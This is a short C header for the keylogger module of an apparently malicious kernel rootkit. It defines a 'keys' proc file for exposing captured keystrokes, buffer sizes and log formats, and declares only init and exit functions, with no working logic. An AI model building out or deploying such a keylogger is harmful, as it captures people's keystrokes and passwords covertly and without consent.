#ifndef KEYLOGGER
#define KEYLOGGER
#include "rootkit.h" 

#define KEYLOGGER_PROC_FILE "keys"
#define KEYLOGGER_PROC_PATH ROOT_PROC_DIR "/" KEYLOGGER_PROC_FILE
#define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
#define CHUNK_LEN 12 /* Encoded 'keycode shift' chunk length */
#define US  0 /* Type code for US character log */
#define HEX 1 /* Type code for hexadecimal log */
#define DEC 2 /* Type code for decimal log */

int keylogger_init(void);
void keylogger_exit(void);



#endif